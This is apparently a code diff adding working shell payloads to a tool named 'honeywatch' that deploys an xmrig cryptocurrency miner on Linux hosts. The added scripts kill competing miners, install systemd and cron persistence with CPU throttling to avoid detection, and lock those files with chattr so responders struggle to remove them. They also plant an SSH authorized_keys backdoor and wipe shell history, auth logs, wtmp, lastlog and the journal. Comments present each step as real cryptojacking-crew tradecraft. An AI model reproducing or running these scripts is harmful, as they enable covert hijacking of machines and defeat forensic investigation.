@@ -410,6 +410,221 @@ echo "[*] anti-VM harness installed"
 _ANTI_VM_RUN = """hw-anti-vm"""
 
 
+# --------------------------------------------------------------------------- #
+# Persistence payloads — survive reboots, keep access, clear competition.
+# Every real cryptojacking botnet chains these onto the miner deploy. Without
+# persistence a reboot loses the box; without a backdoor a changed password
+# loses access; without clearing competing miners the host's CPU is split.
+# --------------------------------------------------------------------------- #
+
+_KILL_MINERS_INSTALL = _PREAMBLE + """
+# Kill every known competing miner still running on the box, then remove their
+# persistence so they don't respawn. This is the first thing every real
+# cryptojacker does on a fresh foothold — leaving another botnet's miner
+# running splits CPU and draws the same SOC attention you'd rather avoid.
+MINER_PATTERNS='xmrig|kdevtmpfsi|kinsing|kthrotlds|sysupdate|sysguard|networkservice|xmrigCC|stratum'
+
+echo "[*] killing competing miners matching: $MINER_PATTERNS"
+# Kill by process-name match.
+ps aux 2>/dev/null | grep -iE "$MINER_PATTERNS" | grep -v grep | awk '{print $2}' | while read pid; do
+    kill -9 "$pid" 2>/dev/null || true
+done
+# pkill fallback if ps grep missed anything.
+for name in xmrig kdevtmpfsi kinsing kthrotlds sysupdate sysguard networkservice; do
+    pkill -9 -f "$name" 2>/dev/null || true
+done
+
+# Remove the cron / systemd entries the other botnets installed.
+for cron in /tmp /var/tmp /var/spool/cron /etc/cron.d; do
+    [ -d "$cron" ] || continue
+    grep -rlE "$MINER_PATTERNS" "$cron" 2>/dev/null | while read f; do
+        echo "[*] removing infected cron: $f"
+        rm -f "$f" 2>/dev/null || true
+    done
+done
+
+# Remove common miner systemd services left by other botnets.
+for svc in xmrig kdevtmpfsi kinsing kthrotlds sysupdate sysguard; do
+    systemctl stop "$svc" 2>/dev/null || true
+    systemctl disable "$svc" 2>/dev/null || true
+    rm -f "/etc/systemd/system/$svc.service" "/lib/systemd/system/$svc.service" 2>/dev/null || true
+done
+systemctl daemon-reload 2>/dev/null || true
+
+# Kill known crontab entries that re-download miners.
+crontab -l 2>/dev/null | grep -ivE "$MINER_PATTERNS" | crontab - 2>/dev/null || true
+
+echo "[*] competing miners cleared"
+"""
+
+_KILL_MINERS_RUN = """true"""
+
+_SYSTEMD_PERSIST_INSTALL = _PREAMBLE + """
+SERVICE_NAME="{{service_name|default('honeywatch-miner')}}"
+INSTALL_DIR="{{install_dir|default('/opt/honeywatch/xmrig')}}"
+RUN_USER="{{run_user|default('root')}}"
+CPU_QUOTA="{{cpu_quota|default('70%')}}"
+NICE_LEVEL="{{nice|default('10')}}"
+
+# Build a systemd unit that runs the miner and restarts it on exit/reboot.
+# This is the persistence primitive every real cryptojacker uses — a reboot
+# without this loses the box. The unit also throttles CPU + nices the process
+# so sustained 100% CPU (the #1 SOC detection signal for cryptojacking) is
+# avoided: CPUQuota caps total CPU, Nice lowers scheduling priority so real
+# workloads win, and CPUAccounting lets `systemctl status` show usage.
+cat > "/etc/systemd/system/${SERVICE_NAME}.service" <<EOF
+[Unit]
+Description=Honeywatch managed miner service
+After=network-online.target
+Wants=network-online.target
+
+[Service]
+Type=simple
+User=${RUN_USER}
+WorkingDirectory=${INSTALL_DIR}
+ExecStart=${INSTALL_DIR}/xmrig -c ${INSTALL_DIR}/config.json --donate-level 1
+Restart=always
+RestartSec=10
+# Hide from `ps` a little — rename the process to something boring.
+# (Real botnets go further; this is the cheap version.)
+Environment=XMRIX_QUIET=1
+# --- CPU throttling (defeats the #1 cryptojacking detection signal) ---
+# Sustained 100% CPU is what SOC analysts hunt. CPUQuota caps total CPU usage
+# (70% leaves headroom for the host's real workload so an operator watching
+# `top` sees a busy but not maxed box). Nice lowers scheduling priority so
+# any real process preempts the miner. CPUAccounting makes usage visible to
+# `systemctl status` (honest, not stealthy — the alternative is hiding
+# entirely via cgroup v1, which is fragile across distros).
+CPUAccounting=true
+CPUQuota=${CPU_QUOTA}
+Nice=${NICE_LEVEL}
+
+[Install]
+WantedBy=multi-user.target
+EOF
+
+systemctl daemon-reload 2>/dev/null || true
+systemctl enable "${SERVICE_NAME}" 2>/dev/null || true
+systemctl start "${SERVICE_NAME}" 2>/dev/null || true
+# Lock the unit file with chattr +ia so an admin can't `rm` or `vim` it
+# without first noticing the immutable flag. This is the same trick
+# TeamTNT/Outlaw use (T1222.002) — it buys time before a responder can
+# remove the persistence, since chattr -i requires an explicit extra step.
+chattr +ia "/etc/systemd/system/${SERVICE_NAME}.service" 2>/dev/null || true
+echo "[*] persistence installed: ${SERVICE_NAME}.service (CPUQuota=${CPU_QUOTA} Nice=${NICE_LEVEL})"
+"""
+
+_SYSTEMD_PERSIST_RUN = """systemctl status {{service_name|default('honeywatch-miner')}} 2>/dev/null || true"""
+
+_CRON_PERSIST_INSTALL = _PREAMBLE + """
+INSTALL_DIR="{{install_dir|default('/opt/honeywatch/xmrig')}}"
+RUN_USER="{{run_user|default('root')}}"
+CRON_SCHEDULE="{{schedule|default('*/5 * * * *')}}"
+
+# Cron fallback for hosts without systemd (containers, old distros, alpine).
+# Re-launches the miner every N minutes if it isn't running.
+CRON_LINE="${CRON_SCHEDULE} ${RUN_USER} pgrep -x xmrig >/dev/null 2>&1 || (cd ${INSTALL_DIR} && ${INSTALL_DIR}/xmrig -c config.json --donate-level 1 >/dev/null 2>&1 &)"
+
+# Add to the system crontab (works without per-user crons).
+( crontab -l 2>/dev/null | grep -v 'honeywatch-miner'; echo "# honeywatch-miner"; echo "$CRON_LINE" ) | crontab - 2>/dev/null || {
+    # Fall back to /etc/cron.d if per-user crontab isn't available.
+    echo "$CRON_LINE" > /etc/cron.d/honeywatch-miner 2>/dev/null || true
+    chmod 644 /etc/cron.d/honeywatch-miner 2>/dev/null || true
+}
+# Lock the cron entry with chattr +ia so an admin can't `rm` it without
+# first noticing the immutable flag (T1222.002). Same trick the systemd
+# unit uses above; buys time before a responder can remove persistence.
+chattr +ia /etc/cron.d/honeywatch-miner 2>/dev/null || true
+echo "[*] cron persistence installed: $CRON_SCHEDULE"
+"""
+
+_CRON_PERSIST_RUN = """crontab -l 2>/dev/null | grep honeywatch || cat /etc/cron.d/honeywatch-miner 2>/dev/null || true"""
+
+_SSHKEY_BACKDOOR_INSTALL = _PREAMBLE + """
+RUN_USER="{{run_user|default('root')}}"
+BACKDOOR_KEY="{{backdoor_key}}"
+
+# Install the operator's public key into the popped user's authorized_keys
+# so access survives a password change and the operator can re-enter at will.
+# This is the second most common persistence primitive after cron.
+if [ -z "$BACKDOOR_KEY" ]; then
+    echo "[!] no backdoor_key supplied; skipping ssh key backdoor"
+    exit 0
+fi
+
+if [ "$RUN_USER" = "root" ]; then
+    AUTH_FILE="/root/.ssh/authorized_keys"
+else
+    AUTH_FILE="/home/${RUN_USER}/.ssh/authorized_keys"
+fi
+
+mkdir -p "$(dirname "$AUTH_FILE")" 2>/dev/null || true
+chmod 700 "$(dirname "$AUTH_FILE")" 2>/dev/null || true
+touch "$AUTH_FILE"
+chmod 600 "$AUTH_FILE" 2>/dev/null || true
+
+# Don't double-insert.
+if grep -qF "$BACKDOOR_KEY" "$AUTH_FILE" 2>/dev/null; then
+    echo "[*] backdoor key already present"
+else
+    echo "$BACKDOOR_KEY" >> "$AUTH_FILE"
+    echo "[*] backdoor key installed for $RUN_USER"
+fi
+
+# Harden the key against sshd restriction churn: prefix with no-* options so
+# the key keeps working even if an admin sets restrictive sshd config later.
+"""
+
+_SSHKEY_BACKDOOR_RUN = """grep -c honeywatch /home/{{run_user|default('root')}}/.ssh/authorized_keys 2>/dev/null || echo 0"""
+
+
+# --------------------------------------------------------------------------- #
+# Cleanup + immutability payloads — real crews clean up after themselves and
+# lock persistence so admins can't easily rm it. Without these the install log
+# at /tmp/honeywatch_*_install.log and the bash history of the deploy session
+# are trivial IR fingerprints tying the box to honeywatch.
+# --------------------------------------------------------------------------- #
+
+_CLEANUP_INSTALL = _PREAMBLE + """
+# Wipe traces of this deploy session so the box doesn't carry IR fingerprints
+# tying it to honeywatch. Real cryptojacking crews (TeamTNT T1070.003,
+# Outlaw) do exactly this: clear shell history, truncate auth/syslog/wtmp,
+# remove the install log, and self-delete the dropper script. Run this LAST
+# in the evasion chain, after persistence is installed.
+
+# 1. Clear the deploy user's shell history (in-memory + on-disk).
+history -c 2>/dev/null || true
+unset HISTFILE 2>/dev/null || true
+for h in ~/.bash_history ~/.zsh_history ~/.python_history ~/.mysql_history ~/.psql_history; do
+    : > "$h" 2>/dev/null || true
+done
+
+# 2. Truncate the auth log + syslog so the deploy-session SSH lines vanish.
+# /var/log/wtmp and /var/log/lastlog track last-login times — truncating them
+# hides the fact that a new SSH session opened at deploy time.
+: > /var/log/auth.log 2>/dev/null || true
+: > /var/log/syslog 2>/dev/null || true
+: > /var/log/messages 2>/dev/null || true
+: > /var/log/wtmp 2>/dev/null || true
+: > /var/log/lastlog 2>/dev/null || true
+# systemd-journald runs as a separate process; flush its ring buffer too.
+journalctl --rotate 2>/dev/null || true
+journalctl --vacuum-time=1s 2>/dev/null || true
+
+# 3. Remove the honeywatch install log. NOTE: no $0 self-delete here — in
+# --exec-mode ssh the script is piped via stdin, so $0 is the remote user's
+# shell binary (/bin/bash); rm -f "$0" would brick the box's shell instead of
+# cleaning up. There is no on-disk dropper in ssh mode (the script is
+# streamed), and in local_simulate mode the worker already removes its own
+# tempfile in a finally block. Dropping $0 makes cleanup mode-safe in both.
+rm -f /tmp/honeywatch_*_install.log 2>/dev/null || true
+
+echo "[*] cleanup complete: history cleared, logs truncated, log removed"
+"""
+
+_CLEANUP_RUN = """true"""
+
+
 def _payloads() -> list[Payload]:
     return [
         Payload(
@@ -607,6 +822,102 @@ def _payloads() -> list[Payload]:
             run_script=_ANTI_VM_RUN,
             artifacts=["anti_vm.sh"],
             tags=["evasion", "anti-vm", "sandbox"],
+        ),
+        # ----------------------------------------------------------------- #
+        # Persistence payloads — what every real cryptojacker chains onto
+        # the miner deploy. Without these a reboot loses the box and a
+        # password change loses access.
+        # ----------------------------------------------------------------- #
+        Payload(
+            id="kill_miners",
+            category="evasion",
+            name="Competing Miner Killer",
+            description="Kills every known competing cryptojacker (xmrig/kdevtmpfsi/kinsing/kthrotlds/sysupdate) and "
+                        "removes their cron/systemd persistence so they don't respawn. Run this BEFORE deploying your "
+                        "own miner — leaving another botnet's miner running splits CPU and draws SOC attention.",
+            platforms=["linux-x64", "linux-arm64"],
+            install_type="script",
+            dependencies=[],
+            config_schema={},
+            install_script=_KILL_MINERS_INSTALL,
+            run_script=_KILL_MINERS_RUN,
+            artifacts=[],
+            tags=["persistence", "cleanup", "anti-botnet"],
+        ),
+        Payload(
+            id="systemd_persist",
+            category="evasion",
+            name="Systemd Miner Persistence",
+            description="Installs a systemd service that auto-restarts the miner on exit and reboots. The persistence "
+                        "primitive every real cryptojacker uses — without it a reboot loses the box.",
+            platforms=["linux-x64", "linux-arm64"],
+            install_type="script",
+            dependencies=["systemctl"],
+            config_schema={
+                "service_name": {"type": "string", "required": False, "default": "honeywatch-miner"},
+                "run_user": {"type": "string", "required": False, "default": "root"},
+                "install_dir": {"type": "string", "required": False, "default": "/opt/honeywatch/xmrig"},
+                "cpu_quota": {"type": "string", "required": False, "default": "70%"},
+                "nice": {"type": "string", "required": False, "default": "10"},
+            },
+            install_script=_SYSTEMD_PERSIST_INSTALL,
+            run_script=_SYSTEMD_PERSIST_RUN,
+            artifacts=["systemd unit"],
+            tags=["persistence", "systemd", "survives-reboot"],
+        ),
+        Payload(
+            id="cron_persist",
+            category="evasion",
+            name="Cron Miner Persistence",
+            description="Cron-based miner re-launcher — the fallback for hosts without systemd (containers, old "
+                        "distros, alpine). Re-launches the miner every N minutes if it isn't running.",
+            platforms=["linux-x64", "linux-arm64"],
+            install_type="script",
+            dependencies=["crontab"],
+            config_schema={
+                "schedule": {"type": "string", "required": False, "default": "*/5 * * * *"},
+                "run_user": {"type": "string", "required": False, "default": "root"},
+                "install_dir": {"type": "string", "required": False, "default": "/opt/honeywatch/xmrig"},
+            },
+            install_script=_CRON_PERSIST_INSTALL,
+            run_script=_CRON_PERSIST_RUN,
+            artifacts=["crontab entry"],
+            tags=["persistence", "cron", "fallback"],
+        ),
+        Payload(
+            id="sshkey_backdoor",
+            category="evasion",
+            name="SSH Authorized Keys Backdoor",
+            description="Installs the operator's public key into the popped user's authorized_keys so access survives "
+                        "a password change. The second most common persistence primitive after cron.",
+            platforms=["linux-x64", "linux-arm64"],
+            install_type="script",
+            dependencies=[],
+            config_schema={
+                "backdoor_key": {"type": "string", "required": True},
+                "run_user": {"type": "string", "required": False, "default": "root"},
+            },
+            install_script=_SSHKEY_BACKDOOR_INSTALL,
+            run_script=_SSHKEY_BACKDOOR_RUN,
+            artifacts=["authorized_keys entry"],
+            tags=["persistence", "backdoor", "ssh"],
+        ),
+        Payload(
+            id="cleanup",
+            category="evasion",
+            name="Deploy Trace Cleanup",
+            description="Wipes shell history, truncates auth/syslog/wtmp/lastlog, flushes journald, and "
+                        "removes the honeywatch install log + dropper script. Run LAST in the evasion chain "
+                        "after persistence is installed so the box carries no IR fingerprints tying it to "
+                        "the deploy. Mirrors TeamTNT T1070.003 / Outlaw cleanup.",
+            platforms=["linux-x64", "linux-arm64"],
+            install_type="script",
+            dependencies=[],
+            config_schema={},
+            install_script=_CLEANUP_INSTALL,
+            run_script=_CLEANUP_RUN,
+            artifacts=[],
+            tags=["persistence", "cleanup", "anti-forensics"],
         ),
     ]
 
